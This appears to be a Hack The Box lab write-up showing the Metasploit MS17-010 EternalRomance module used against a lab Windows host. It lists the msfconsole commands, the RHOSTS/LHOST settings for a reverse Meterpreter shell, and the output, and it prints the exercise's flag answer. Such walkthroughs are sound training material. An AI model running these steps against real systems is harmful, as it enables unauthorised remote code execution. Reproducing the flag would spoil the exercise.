### Modules Exercise
 
IP: 10.129.2.141
 
---
 
### Question 1:
Use the Metasploit-Framework to exploit the target with EternalRomance. Find the flag.txt file on Administrator's desktop and submit the contents as the answer.
 
Since the question says to use EternalRomance against the target, I can skip Information Gathering and get right into pre-exploitation.
 
I start by loading up msfconsole and search for eternalromance, finding one that looks good.
 
```diff
+ [msf](Jobs:0 Agents:0) >> search eternalromance
```
 
	Matching Modules
	================
	   #   Name                                  Disclosure Date  Rank    Check  Description
	   -   ----                                  ---------------  ----    -----  -----------
	   0   exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
 
```diff
+ [msf](Jobs:0 Agents:0) >> use 0
```
 
I then configure the options, setting the rhosts and lhost.
 
```diff
+ [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> setg RHOSTS 10.129.2.141
+ [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> setg LHOST 10.10.14.75
```
 
	RHOSTS => 10.129.2.141
	LHOST => 10.10.14.75
 
After that's done, I run the module.
 
```diff
+ [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> run
```
 
	(Meterpreter 1)(C:\Windows\system32)
 
I navigate around to the Administrator's desktop and find the flag.
 
```diff
+ (Meterpreter 1)(C:\Windows\system32) cd C:\Users\Administrator\Desktop
+ (Meterpreter 1)(C:\Users\Administrator\Desktop) ls
```
 
	Listing: C:\Users\Administrator\Desktop
	=======================================
	Mode              Size  Type  Last modified              Name
	----              ----  ----  -------------              ----
	100666/rw-rw-rw-  282   fil   2020-10-05 19:18:25 -0400  desktop.ini
	100666/rw-rw-rw-  29    fil   2022-05-16 07:19:21 -0400  flag.txt
 
```diff
+ (Meterpreter 1)(C:\Users\Administrator\Desktop) cat flag.txt
```
 
	HTB{MSF-W1nD0w5-3xPL01t4t10n}
 
&#x1F6A9; found **HTB{MSF-W1nD0w5-3xPL01t4t10n}**.
